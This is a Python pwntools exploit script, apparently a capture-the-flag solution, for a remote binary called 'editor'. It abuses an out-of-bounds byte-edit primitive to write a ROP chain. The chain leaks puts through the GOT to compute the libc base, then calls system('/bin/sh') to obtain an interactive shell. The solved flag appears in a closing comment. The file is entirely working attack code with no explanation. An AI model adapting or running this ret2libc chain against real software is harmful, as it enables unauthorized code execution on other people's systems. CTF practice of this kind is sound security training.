
from pwn import *
import sys

# r = process('./editor')   
r = remote('editor.litctf.live', 1337)
libc = ELF('./libc-2.31.so')

puts = libc.sym['puts']

# gdb.attach(r, """
#     b *0x40125E
#     b *0x40133A
#     b *0x4013AE
# """)

p = b'A' * 136

got = 0x403FC0
plt = 0x401040
main = 0x40125E
pop_rdi = 0x40140b #: pop rdi; ret; 

r.recvuntil(b'gets):\n')
r.sendline(p)

r.recvuntil(b'do?\n')

r.sendline('1')
r.recvuntil(b'change!\n')
r.sendline(f'-32')
r.recvuntil(b'to!\n')
r.sendline(b'\x00')

p = (0x4343434343434343).to_bytes(8, byteorder='little')
p += (pop_rdi).to_bytes(3, byteorder='little').ljust(8, b'\x44')
p += (got).to_bytes(3, byteorder='little').ljust(8, b'\x44')
p += (plt).to_bytes(3, byteorder='little').ljust(8, b'\x44')
p += (main).to_bytes(3, byteorder='little').ljust(8, b'\x44')

l = 0
for i in range(144, 144 + len(p)): 
    r.recvuntil(b'do?\n')
    r.sendline('1')
    r.recvuntil(b'change!\n')
    r.sendline(f'{i}')
    r.recvuntil(b'to!\n')
    r.sendline(p8(p[l]))
    l += 1

ll = [155, 156, 157, 158, 159, 163, 164, 165, 166, 167, 171, 172, 173, 174, 175, 179, 180, 181, 182, 183][::-1]

for i in ll: 
    r.recvuntil(b'do?\n')
    r.sendline('1')
    r.recvuntil(b'change!\n')
    r.sendline(f'{i}')
    r.recvuntil(b'to!\n')
    r.sendline(b'\x00')

r.sendline('1')

r.recvuntil(b'change!\n')
r.sendline('136')

r.recvuntil(b'to!\n')
r.sendline(b'\x00')

r.sendline('3')

p = b'F' * (136)

LIBC_BASE = int.from_bytes(r.recvuntil(b'gets):\n').split()[25], byteorder='little') - puts

# ADDR_BINSH = next(libc.search(b'/bin/sh')) + LIBC_BASE - 4 # local
ADDR_BINSH = next(libc.search(b'/bin/sh')) + LIBC_BASE
ADDR_SYSTEM = libc.symbols['system'] + LIBC_BASE

log.info(f'LIBC    : {hex(LIBC_BASE)}')
log.info(f'BIN_SH  : {hex(ADDR_BINSH)}')
log.info(f'SYSTEM  : {hex(ADDR_SYSTEM)}')

r.sendline(p)

p = (0x4343434343434343).to_bytes(8, byteorder='little')
p += (pop_rdi+1).to_bytes(3, byteorder='little').ljust(8, b'\x44')
p += (pop_rdi).to_bytes(3, byteorder='little').ljust(8, b'\x44')
p += (ADDR_BINSH).to_bytes(6, byteorder='little').ljust(8, b'\x44')
p += (ADDR_SYSTEM).to_bytes(6, byteorder='little').ljust(8, b'\x44')

l = 0
for i in range(144, 144 + len(p)): 
    r.recvuntil(b'do?\n')
    r.sendline('1')
    r.recvuntil(b'change!\n')
    r.sendline(f'{i}')
    r.recvuntil(b'to!\n')
    r.sendline(p8(p[l]))
    l += 1

r.sendline('1')

r.recvuntil(b'change!\n')
r.sendline('136')

r.recvuntil(b'to!\n')
r.sendline(b'\x42')

ll = [155, 156, 157, 158, 159, 163, 164, 165, 166, 167, 174, 175, 182, 183][::-1]

for i in ll: 
    r.recvuntil(b'do?\n')
    r.sendline('1')
    r.recvuntil(b'change!\n')
    r.sendline(f'{i}')
    r.recvuntil(b'to!\n')
    r.sendline(b'\x00')

r.sendline('1')

r.recvuntil(b'change!\n')
r.sendline('136')

r.recvuntil(b'to!\n')
r.sendline(b'\x00')

r.sendline('3')

r.interactive()

# flag{y3t_4n0th3r_b0r1ng_r3t2l1bc}
